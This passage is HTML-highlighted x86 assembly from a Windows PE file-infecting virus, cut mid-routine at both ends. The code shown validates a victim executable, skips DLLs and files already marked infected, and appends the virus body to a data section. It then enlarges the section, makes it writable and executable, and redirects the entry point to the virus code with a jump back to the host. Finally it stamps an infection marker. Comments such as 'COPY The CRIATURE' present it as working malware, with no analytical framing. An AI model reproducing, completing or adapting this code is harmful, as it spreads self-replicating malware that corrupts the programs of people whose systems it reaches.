        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc4">]</span><span class="sc5">.MINIHead.DirPE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_PEHEAD</span><span class="sc0">  
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEHEAD</span><span class="sc4">]</span><span class="sc5">.PEH.maggic</span><span class="sc4">,</span><span class="sc2">4550h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NO_ES_PE_EXE_YCIERRO</span><span class="sc0">

</span><span class="sc1">;;compruve if it is a executale</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEHEAD</span><span class="sc4">]</span><span class="sc5">.PEH.caracteristic</span><span class="sc0"> 
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000000010b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NO_ES_PE_EXE_YCIERRO</span><span class="sc0">

</span><span class="sc1">;;i look for if it a .DLL</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEHEAD</span><span class="sc4">]</span><span class="sc5">.PEH.caracteristic</span><span class="sc0"> 
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10000000000000b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NO_ES_PE_EXE_YCIERRO</span><span class="sc0">

</span><span class="sc1">;;if infected??</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc4">]</span><span class="sc5">.MINIHead.IS_INFECTED</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0"> 
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">YA_ESTA_INFECTADO</span><span class="sc0">



</span><span class="sc1">;;ok here is a PE no infected</span><span class="sc0">
</span><span class="sc1">;;we have:</span><span class="sc0">
</span><span class="sc1">;;EBX==&gt;HANDLE</span><span class="sc0">
</span><span class="sc1">;;DWORD PTR [ebp+OFFSET_ABS_NiniH].MINIHead.DirPE==&gt;ptr newhead</span><span class="sc0">

</span><span class="sc1">;;get the optional head</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc4">]</span><span class="sc5">.MINIHead.DirPE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_PEOHEAD</span><span class="sc0">
</span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">READ_FILE</span><span class="sc0">


</span><span class="sc1">;;Serch for section to infect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc4">]</span><span class="sc5">.MINIHead.DirPE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEHEAD</span><span class="sc4">]</span><span class="sc5">.PEH.SieoffOH</span><span class="sc0"> 
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;; me situo en la section data</span><span class="sc0">

</span><span class="sc1">;;;EDX=SECTION HEAD</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;;;Read section</span><span class="sc0">
</span><span class="sc5">serchseccion</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0040h</span><span class="sc0">        </span><span class="sc1">;Is a data segment??</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Proccima_seccion</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">Proccima_seccion</span><span class="sc0">                   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_DUMMY</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
                        
</span><span class="sc5">Proccima_seccion</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEHEAD</span><span class="sc4">]</span><span class="sc5">.PEH.NofSections</span><span class="sc0"> 
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">listoserch</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">  </span><span class="sc1">;next sections</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">serchseccion</span><span class="sc0">
</span><span class="sc5">listoserch</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_DUMMY</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">
</span><span class="sc1">;;In EDX i have the addres to the secction for infect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_DUMMY</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">;;save the address</span><span class="sc0">


</span><span class="sc1">;;Get the size of File</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FILE_SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc1">;;pointer to rawdata</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc1">;;;virtadress</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SALTOTRUEEP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEOHEAD</span><span class="sc4">]</span><span class="sc5">.PEOH.IMAGEBASE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEOHEAD</span><span class="sc4">]</span><span class="sc5">.PEOH.IMAGEBASE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEOHEAD</span><span class="sc4">]</span><span class="sc5">.PEOH.EntryPointHEHEHE</span><span class="sc0">
</span><span class="sc1">;;;EAX=addres to the Entry Point</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc1">;;save the addres to return to the host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SALTOTRUEEP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> 
 
</span><span class="sc1">;;COPY The CRIATURE HAHAhehejejeje</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FILE_SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZE_VIRUS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FILE_SIZE</span><span class="sc0">
</span><span class="sc1">;;;eax=Size of infected file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;;Set the new size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> 

</span><span class="sc1">;;ebx=size of thw old sectors</span><span class="sc0">
</span><span class="sc1">;;ecx=size of the new sectors</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEOHEAD</span><span class="sc4">]</span><span class="sc5">.PEOH.zizeofinitdata</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0"> 
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEOHEAD</span><span class="sc4">]</span><span class="sc5">.PEOH.zizeofinitdata</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0"> 


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">SIZE_VIRUS</span><span class="sc0">

</span><span class="sc1">;;ebx=addres in reference to the beguin</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc1">;;pointer to rawdata</span><span class="sc0">

</span><span class="sc1">;;ebx=addres in reference to the segment base</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc1">;;;virtadress</span><span class="sc0">

</span><span class="sc1">;;ebx=address where charge my segments</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_WinMain2</span><span class="sc0"> </span><span class="sc1">;;por ultimo le sumo el offset el EP</span><span class="sc0">

</span><span class="sc1">;;Set the new Entry point</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEOHEAD</span><span class="sc4">]</span><span class="sc5">.PEOH.EntryPointHEHEHE</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">


</span><span class="sc1">;;Is time to GET THE CONTROL</span><span class="sc0">

</span><span class="sc1">;;Save all reformed</span><span class="sc0">
</span><span class="sc1">;;PEHEAD</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc4">]</span><span class="sc5">.MINIHead.DirPE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_PEHEAD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">

</span><span class="sc1">;;;;;PEOHEAD</span><span class="sc0">
</span><span class="sc1">;;;;;set the size of new image to charge</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_PEOHEAD</span><span class="sc4">]</span><span class="sc5">.PEOH.SizeOfImagen</span><span class="sc4">,</span><span class="sc5">SIZE_VIRUS</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc4">]</span><span class="sc5">.MINIHead.DirPE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_PEOHEAD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">

</span><span class="sc1">;;;;;SECTOR HEAD</span><span class="sc0">
</span><span class="sc1">;;;;;Set the sector characteristic</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">0c0000040h</span><span class="sc0">
</span><span class="sc1">;;get the addres saved.....</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_SECTION_DUMMY</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">

</span><span class="sc1">;;sign the file as infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc4">]</span><span class="sc5">.MINIHead.IS_INFECTED</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">59</span><span class="sc0">     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                                                                                                                                                                                                   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">

</span><span class="sc1">;;Close the file an go...</span><span class="sc0">
